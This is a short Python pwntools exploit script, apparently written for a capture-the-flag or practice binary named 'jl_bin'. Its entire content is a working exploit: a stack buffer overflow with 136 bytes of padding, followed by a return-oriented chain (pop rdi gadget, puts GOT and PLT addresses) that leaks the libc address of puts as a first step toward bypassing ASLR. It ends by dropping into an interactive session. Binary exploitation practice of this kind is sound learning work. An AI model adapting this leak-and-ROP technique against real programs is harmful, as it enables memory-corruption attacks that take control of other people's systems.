from pwn import *

p = process('./jl_bin')

context(os='linux',arch='amd64')

junk = "A"*136
pop_rdi = p64(0x40179b)
got_put = p64(0x404028)
plt_put = p64(0x401050)

payload = junk + pop_rdi + got_put + plt_put

# send payload when the programs start
p.sendline(payload)
p.recvline() # wait until break line
p.recvline() # wait until access denied

# Leaked address printed in a readable format
leaked_puts =  p.recvline().strip().ljust(8, "\x00")
log.success('Leaked puts@GLIBC: ' + str(leaked_puts))

p.interactive(prompt="")